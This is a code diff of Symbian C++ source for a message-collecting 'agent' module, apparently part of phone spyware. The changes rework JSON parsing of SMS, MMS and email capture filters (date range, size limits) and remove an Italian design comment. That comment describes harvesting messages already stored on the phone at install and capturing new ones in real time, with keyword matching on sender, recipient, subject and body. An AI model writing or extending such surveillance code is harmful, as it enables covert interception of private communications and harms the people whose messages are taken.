@@ -30,7 +30,7 @@ _LIT(KClassSms,"IPM.SMSText*");
 _LIT(KClassMail,"IPM.Note*");
 _LIT(KClassMms,"IPM.MMS*");
 _LIT(KUs, "Local");
-_LIT(KNullDate, "0000-00-00 00:00:00");
+//_LIT(KNullDate, "0000-00-00 00:00:00");
 
 enum TObjectType {
 		EStringFolder           = 0x01000000,
@@ -117,6 +117,7 @@ void CAgentMessages::FillFilter(CMessageFilter* aFilter, const TAgentClassFilter
 			{
 			aFilter->SetStartDate(aFilterHeader.iFromDate);
 			}
+		/*
 		else 
 			{
 			_LIT(KInitialTime,"16010000:000000");
@@ -124,14 +125,15 @@ void CAgentMessages::FillFilter(CMessageFilter* aFilter, const TAgentClassFilter
 			TTime initialFiletime;
 			initialFiletime.Set(KInitialTime);
 			}
+			*/
 		if (aFilter->iUntilFilter) 
 			{
 			aFilter->SetEndDate(aFilterHeader.iToDate);
 			}
+		//message size, meaningful only for email messages
+		aFilter->iMaxMessageBytesToLog = aFilterHeader.iMaxSize;  
+		aFilter->iMaxMessageSize = aFilterHeader.iMaxSize;  
 		}
-	//message size, meaningful only for email messages
-	aFilter->iMaxMessageBytesToLog = 0;  //TODO: complete when conf ready
-	aFilter->iMaxMessageSize = 0;  //TODO: complete when conf ready
 	}
 
 void CAgentMessages::GetFilterData(TAgentClassFilter& aFilter, const CJsonObject* aJsonObject)
@@ -143,31 +145,24 @@ void CAgentMessages::GetFilterData(TAgentClassFilter& aFilter, const CJsonObject
 		CJsonObject* filterObject;
 		aJsonObject->GetObjectL(_L("filter"),filterObject);
 		//check history
-		filterObject->GetBoolL(_L("history"),aFilter.iHistory);
-		//TODO: change check on dateto
-		//check date "0000-00-00 00:00:00" 
+		if(filterObject->Find(_L("history")) != KErrNotFound)
+			filterObject->GetBoolL(_L("history"),aFilter.iHistory);
+		// get date from
 		TBuf<24> dateFrom;
 		filterObject->GetStringL(_L("datefrom"),dateFrom);
-		if(dateFrom.Compare(KNullDate) == 0)
+		aFilter.iDoFilterFromDate = ETrue;
+		aFilter.iFromDate = TimeUtils::GetSymbianDate(dateFrom);
+		// get date to
+		if(filterObject->Find(_L("dateto")) != KErrNotFound)
 			{
-			aFilter.iDoFilterFromDate = EFalse;
-			}
-		else
-			{
-			aFilter.iDoFilterFromDate = ETrue;
-			aFilter.iFromDate = TimeUtils::GetSymbianDate(dateFrom);
-			}
-		TBuf<24> dateTo;
-		filterObject->GetStringL(_L("dateto"),dateTo);
-		if(dateTo.Compare(KNullDate) == 0)
-			{
-			aFilter.iDoFilterToDate = EFalse;
-			}
-		else
-			{
+			TBuf<24> dateTo;
+			filterObject->GetStringL(_L("dateto"),dateTo);
 			aFilter.iDoFilterToDate = ETrue;
 			aFilter.iToDate = TimeUtils::GetSymbianDate(dateTo);
 			}
+		// get max size
+		if(filterObject->Find(_L("maxsize")) != KErrNotFound)
+			filterObject->GetIntL(_L("maxsize"),aFilter.iMaxSize);
 		}
 	}
 
@@ -308,12 +303,15 @@ void CAgentMessages::StartAgentCmdL()
 			iSmsRuntimeFilter->ModifyFilterRange(iMarkup.smsMarkup+oneMicrosecond);
 		*/
 		
-		} else {
+		} 
+	else 
+		{
+			//TODO:see again this one
 		_LIT(KInitTime,"16010000:000000");
 		iMarkup.smsMarkup.Set(KInitTime);
 		iMarkup.mmsMarkup.Set(KInitTime);
 		iMarkup.mailMarkup.Set(KInitTime);
-	}
+		}
 	
 	iLogNewMessages = ETrue;
 	iLongTask->NextRound();
@@ -868,14 +866,15 @@ HBufC8* CAgentMessages::GetMailBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aM
 		mailMtm->Body().Extract(ptr,0);
 		TInt size = ptr.Size();
 		CleanupStack::PopAndDestroy(bodyBuf);
-		if((aFilter->iMaxMessageSize != 0) && (aFilter->iMaxMessageSize < size)){
-		// out of bound
-		CleanupStack::PopAndDestroy(mailMtm);
-		CleanupStack::PopAndDestroy(entry);
-		//CleanupStack::PopAndDestroy(buffer);
-		CleanupStack::PopAndDestroy(mailBuffer);
-		return HBufC8::New(0);
-		}	
+		if((aFilter->iMaxMessageSize != 0) && (aFilter->iMaxMessageSize < size))
+			{
+			// out of bound
+			CleanupStack::PopAndDestroy(mailMtm);
+			CleanupStack::PopAndDestroy(entry);
+			//CleanupStack::PopAndDestroy(buffer);
+			CleanupStack::PopAndDestroy(mailBuffer);
+			return HBufC8::New(0);
+			}	
 		TInt logSize;
 		if((aFilter->iMaxMessageBytesToLog!=0) && (aFilter->iMaxMessageBytesToLog < size))
 			logSize = aFilter->iMaxMessageBytesToLog;
@@ -1331,103 +1330,6 @@ void CAgentMessages::WriteMailFile(const TDesC8& aData)
 	fs.Close();
 }
 */
-/*
- Serializzazione dei dati
-
- Ogni blocco di configurazione e' serializzato anteponendo una DWORD (4 byte), chiamato Prefix, utilizzato per identificare il tipo di dato che segue e la sua lunghezza.
-
- | TYPE (1 byte) | SIZE (3 bytes) |
-
- Una serie di oggetti binari serializzati, siano essi stringhe o strutture complesse, risulteranno serializzate come segue:
-
- | PREFIX | string DATA | PREFIX | struct DATA | PREFIX | ... |
-
- E' ovviamente possibile serializzare un oggetto a sua volta composto da dati serializzati, come viene fatto per la configurazione dell'agente Messages.
- Configurazione
-
- La configurazione dell'agente messaggi e' dinamica, e costituita secondo il seguente schema:
-
- ----------------------
- IDENTIFICATION TAG
- ----------------------
- filtri COLLECT
- ----------------------
- filtri REALTIME
- ----------------------
-
- LIdentification Tag e' una stringa alfanumerica di 32 byte, generata randomicamente in base al tempo attuale in modo che sia univoca, ed e' utilizzata per verificare in modo semplice se la configurazione e' stata modificata.
-
- I filtri Collect sono filtri utilizzati per raccogliere messaggi gia' presenti sul telefono all'atto dell'installazione o comunque del primo avvio dell'agente Messages.
-
- I filtri Realtime sono filtri utilizzati per raccogliere i messaggi in entrata o uscita dal telefono mentre l'agente e' in esecuzione.
-
- La configurazione e' serializzata col seguente formato:
-
- | PREFIX | Identification tag | PREFIX | filtro | PREFIX | ... | PREFIX | filtro |
-
- Ciascun filtro e' applicato ad una sola classe di messaggi (mail, sms o mms), e tutte le keyword ad esso associate vengono applicate su ciascun messaggio di quella classe per verificare se debba essere scartato o accettato.
- Formato dei filtri
-
- Ciascun filtro e' strutturato come segue:
-
- -----------
- HEADER
- -----------
- keyword
- -----------
- ...
- -----------
- keyword
- -----------
-
- Sia il campo header che ciascuna keyword e' serializzata come oggetto singolo. Le keyword sono sempre serializzate come stringhe di WCHAR. Un filtro privo di keyword impone la cattura di tutti i messaggi.
-
- L'header contiene i seguenti campi:
-
- #define REALTIME  0
- #define COLLECT   1
-
- #define AGENTCONF_CLASSNAMELEN  32
- #define FILTER_CLASS_V1_0       0x40000000
-
- struct AgentClassFilterHeader {
- DWORD Size;                                       // dimensione in byte dell'header e delle keyword
- 
- DWORD Version;                                    // al momento, sempre settato a FILTER_CLASS_V1_0
- 
- DWORD Type;                                       // REALTIME o COLLECT
- 
- TCHAR MessageClass[AGENTCONF_CLASSNAMELEN];       // Classe del messaggio 
- 
- BOOL Enabled;                                     // FALSE per le classi disabilitate, altrimenti TRUE
- 
- BOOL All;                                         // se TRUE, accetta tutti i messaggi della classe 
- // (ignora keyword)
- 
- BOOL DoFilterFromDate;                            // accetta i messaggi a partire da FromDate
- FILETIME FromDate;                  
- 
- BOOL DoFilterToDate;                              // accetta i messaggi fino a ToDate
- FILETIME ToDate;                    
- 
- LONG MaxMessageSize;                              // filtra in base alla dimensione del messaggio 
- // 0 indica di accettare tutti i messaggi
- 
- LONG MaxMessageBytesToLog;                        // di ciascun messaggio, prendi solo MaxMessageBytesToLog  
- // 0 indica di accettare tutto il messaggio
- } header;
-
- Il parametro MessageClass e' valorizzato con una delle seguenti stringhe, in base al tipo di messaggio a cui il filtro verra' applicato:
-
- #define CLASS_SMS       TEXT("IPM.SMSText*")
- #define CLASS_MAIL      TEXT("IPM.Note*")
- #define CLASS_MMS       TEXT("IPM.MMS*")
-
- Perche' la configurazione sia ritenuta valida, e' necessario che siano sempre presenti un filtro realtime e un filtro collect per ciascuna delle classi di messaggio presentate.
-
- Nel caso in cui siano presenti una o piu' keyword, queste devono essere cercate all'interno di tutti i campi testuali componenti il messaggio (in particolar modo Mittente, Destinatario, Oggetto e corpo del messaggio, qualora presenti). 
-
- */
 
 /*
  * PER LA CREAZIONE DEL LOG:
